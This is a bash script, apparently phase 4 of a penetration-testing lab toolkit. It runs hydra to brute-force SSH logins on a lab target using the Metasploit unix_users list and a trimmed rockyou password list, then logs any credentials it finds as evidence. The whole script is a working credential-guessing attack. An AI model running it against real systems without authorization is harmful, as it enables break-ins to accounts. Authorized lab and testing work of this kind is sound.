#!/usr/bin/env bash
# Phase 4 — Brute force con hydra contra SSH
# IMPORTANTE: ejecutar default-creds.sh primero

source "$(dirname "$0")/../lib/common.sh"

validate_target "${LAB_TARGET}"
EVIDENCE_DIR=$(init_evidence_dir "phase-4-credentials")
banner "Phase 4 — Credential brute force (SSH)"

USER_LIST="${1:-/usr/share/wordlists/metasploit/unix_users.txt}"
PASS_LIST="${2:-/usr/share/wordlists/rockyou.txt.gz}"

# Descomprimir rockyou si está comprimido
if [[ "$PASS_LIST" == *.gz ]]; then
    log INFO "Decompressing wordlist"
    gunzip -k "$PASS_LIST" 2>/dev/null || true
    PASS_LIST="${PASS_LIST%.gz}"
fi

[[ -f "$USER_LIST" ]] || { log ERROR "User list not found: ${USER_LIST}"; exit 1; }
[[ -f "$PASS_LIST" ]] || { log ERROR "Password list not found: ${PASS_LIST}"; exit 1; }

log INFO "User list : ${USER_LIST}"
log INFO "Pass list : ${PASS_LIST}"
log WARN "Limiting to first 100 passwords to keep the run reasonable"
head -100 "$PASS_LIST" > "${EVIDENCE_DIR}/passwords-trimmed.txt"

hydra -L "${USER_LIST}" -P "${EVIDENCE_DIR}/passwords-trimmed.txt" \
    -t 4 -V -f \
    -o "${EVIDENCE_DIR}/hydra-results.txt" \
    "ssh://${LAB_TARGET}" 2>&1 | tee "${EVIDENCE_DIR}/hydra.log" || true

log INFO "Hydra results:"
grep "login:" "${EVIDENCE_DIR}/hydra-results.txt" \
    | tee -a "${EVIDENCE_DIR}/run.log" || log INFO "No credentials found in this run"

finalize
